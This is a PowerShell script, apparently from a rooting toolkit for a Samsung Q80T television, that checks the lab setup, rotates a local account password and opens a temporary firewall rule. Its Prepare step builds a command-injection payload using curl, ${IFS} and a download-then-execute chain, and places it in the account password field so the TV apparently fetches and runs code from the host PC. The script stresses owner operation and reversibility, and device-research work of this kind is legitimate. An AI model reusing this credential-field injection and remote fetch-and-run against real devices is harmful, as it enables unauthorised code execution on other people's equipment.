# Owner-operated bounded snapshot trial. Requires the existing disposable lab.
[CmdletBinding()]
param([Parameter(Mandatory=$true)][ValidateSet('Doctor','Prepare','Listen','Restore')][string]$Action)
$ErrorActionPreference = 'Stop'
$root = (Resolve-Path (Join-Path $PSScriptRoot '..\..')).Path
$lab = Join-Path $root '.local\tiz0wn-lab'
$envFile = Join-Path $lab 'lab.env'
$backup = Join-Path $lab 'lab.env.before-snapshot'
$sessionFile = Join-Path $lab 'snapshot-session.json'
$compose = Join-Path $PSScriptRoot 'lab\compose.yml'
$firewall = 'DansTVProbe-Temporary-Snapshot-HTTP'
$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw 'Run this command in Administrator PowerShell.'
}
$owner = Get-Content -LiteralPath (Join-Path $lab 'ownership.json') -Raw | ConvertFrom-Json
$device = Get-Content -LiteralPath (Join-Path $root '.local\device.json') -Raw | ConvertFrom-Json
$preflight = Get-Content -LiteralPath (Join-Path $root '.local\tiz0wn-preflight.json') -Raw | ConvertFrom-Json
if ($owner.user -ne 'danstvprobe' -or $owner.share -ne 'DansTVProbe' -or $owner.tv -ne $device.host -or
    $preflight.model_from_tv_menu -ne 'QA65Q80TAWXXY' -or $preflight.platform_version -ne '5.5' -or
    $preflight.cpu_arch -ne 'armv7' -or $preflight.firmware_confirmed -ne $true -or
    $preflight.firmware_from_current_tv_menu -ne 'T-NKMUABC-2743.0') {
    throw 'Lab target changed; review exact Q80T configuration before proceeding.'
}
foreach ($address in @($owner.pc, $owner.tv)) {
    $parsed = [Net.IPAddress]::Parse($address)
    if ($parsed.AddressFamily -ne [Net.Sockets.AddressFamily]::InterNetwork) { throw 'IPv4 lab required.' }
}
# Owner-run, read-only Windows host preflight. Never contacts the television.
if ($Action -eq 'Doctor') {
    if (-not (Test-Path -LiteralPath $envFile -PathType Leaf)) {
        throw 'Missing private lab.env. Restore or recreate the disposable lab first.'
    }
    if ((Test-Path -LiteralPath $backup) -or (Test-Path -LiteralPath $sessionFile) -or
        (Test-Path -LiteralPath (Join-Path $lab 'lab.env.before-uid'))) {
        throw 'An earlier lab session is active. Restore and review it before preparing a new one.'
    }
    if (-not (Get-LocalUser -Name 'danstvprobe' -ErrorAction SilentlyContinue)) {
        throw 'Disposable local account danstvprobe is missing.'
    }
    if (-not (Get-SmbShare -Name 'DansTVProbe' -ErrorAction SilentlyContinue)) {
        throw 'Dedicated lab share DansTVProbe is missing.'
    }
    if (Get-NetTCPConnection -State Listen -LocalPort 8181 -ErrorAction SilentlyContinue) {
        throw 'Port 8181 is already listening; do not overlap diagnostic sessions.'
    }
    if (-not (Get-Command py -ErrorAction SilentlyContinue)) {
        throw 'Python launcher py is missing; install Python 3 before running the receiver.'
    }
    if (-not (Get-Command docker -ErrorAction SilentlyContinue)) {
        throw 'Docker is missing; do not start the snapshot trial.'
    }
    & docker compose version | Out-Null
    if ($LASTEXITCODE -ne 0) {
        throw 'Docker Compose is unavailable.'
    }
    foreach ($file in @('snapshot.sh', 'root-bridge.py', 'paste-password.py')) {
        if (-not (Test-Path -LiteralPath (Join-Path $PSScriptRoot $file) -PathType Leaf)) {
            throw ('Missing reviewed helper: ' + $file)
        }
    }
    Write-Output 'Q80T host diagnostic: passed model, firmware, owned lab, Python, Docker, share and free callback-port checks.'
    Write-Output 'No TV connection, account password changes, firewall rules or package operations were performed.'
    Write-Output 'Next: run -Action Prepare only when ready for the owner-operated, reversible TV trial.'
    return
}
function Password([string]$file) {
    $entries = @(Get-Content -LiteralPath $file | Where-Object { $_.StartsWith('TVPROBE_PASSWORD=') })
    if ($entries.Count -ne 1) { throw 'Expected one lab password.' }
    return $entries[0].Substring('TVPROBE_PASSWORD='.Length)
}
function Rotate([string]$password) {
    $null = Password $envFile
    $lines = @(Get-Content -LiteralPath $envFile | ForEach-Object {
        if ($_.StartsWith('TVPROBE_PASSWORD=')) { 'TVPROBE_PASSWORD=' + $password } else { $_ }
    })
    Set-LocalUser -Name 'danstvprobe' -Password (ConvertTo-SecureString $password -AsPlainText -Force)
    $lines | Set-Content -LiteralPath $envFile -Encoding ASCII
    & docker compose --env-file $envFile -f $compose up -d --force-recreate --no-build
    if ($LASTEXITCODE -ne 0) { throw 'XRDP restart failed; run Restore.' }
}
if ($Action -eq 'Restore') {
    # Revoke the network listener first; preserve backup until both credentials restore.
    Get-NetFirewallRule -Name $firewall -ErrorAction SilentlyContinue | Remove-NetFirewallRule
    if (Test-Path -LiteralPath $backup) {
        Rotate (Password $backup)
        Remove-Item -LiteralPath $backup
    }
    if (Test-Path -LiteralPath $sessionFile) { Remove-Item -LiteralPath $sessionFile }
    Write-Output 'Snapshot access revoked and lab credentials restored. Update TV saved password from lab.env.'
    return
}
if ($Action -eq 'Prepare') {
    if ((Test-Path $backup) -or (Test-Path $sessionFile) -or (Test-Path (Join-Path $lab 'lab.env.before-uid'))) {
        throw 'An earlier trial is active. Restore it before preparing a new one.'
    }
    if ((Get-NetFirewallRule -Name $firewall -ErrorAction SilentlyContinue) -or (Get-NetTCPConnection -State Listen -LocalPort 8181 -ErrorAction SilentlyContinue)) {
        throw 'Callback port or firewall rule already active.'
    }
    $bytes = New-Object byte[] 12
    $rng = [Security.Cryptography.RandomNumberGenerator]::Create()
    try { $rng.GetBytes($bytes) } finally { $rng.Dispose() }
    $token = ([BitConverter]::ToString($bytes) -replace '-','').ToLowerInvariant()
    $tmp = '/tmp/dtv' + $token.Substring(0,6)
    $probe = '$(/usr/bin/curl${IFS}-fsS${IFS}http://' + $owner.pc + ':8181/d/' + $token + '>' + $tmp + '&&.${IFS}' + $tmp + ')'
    if ($probe.Length -gt 160) { throw 'Trigger exceeds measured TV input limit.' }
    Copy-Item -LiteralPath $envFile -Destination $backup -ErrorAction Stop
    try {
        [ordered]@{token=$token; host=$owner.pc; tv=$owner.tv; output=(Join-Path $lab ('snapshot-' + $token + '.txt'))} |
            ConvertTo-Json | Set-Content -LiteralPath $sessionFile -Encoding ASCII
        Rotate $probe
        New-NetFirewallRule -Name $firewall -DisplayName 'DansTV temporary snapshot callback' -Direction Inbound -Action Allow -Protocol TCP -LocalAddress $owner.pc -LocalPort 8181 -RemoteAddress $owner.tv -Profile Any | Out-Null
    } catch {
        Write-Warning 'Prepare incomplete. Run root-bridge.ps1 -Action Restore before retrying.'
        throw
    }
    Write-Output 'XRDP restarted. Private trial password is in .local/tiz0wn-lab/lab.env; do not share it.'
    Write-Output 'Next run root-bridge.ps1 -Action Listen in this elevated window.'
    return
}
if (-not (Test-Path $backup)) { throw 'Prepare the snapshot trial first.' }
$session = Get-Content -LiteralPath $sessionFile -Raw | ConvertFrom-Json
if ($session.host -ne $owner.pc -or $session.tv -ne $owner.tv -or $session.token -notmatch '^[0-9a-f]{24}$') {
    throw 'Invalid snapshot session.'
}
try {
    & py -3 (Join-Path $PSScriptRoot 'root-bridge.py') --host $session.host --tv $session.tv --token $session.token --output $session.output
    if ($LASTEXITCODE -ne 0) { throw 'No validated snapshot received.' }
} finally {
    # Listener is synchronous and has exited. Credentials remain recoverable on failure.
    & $PSCommandPath -Action Restore
}
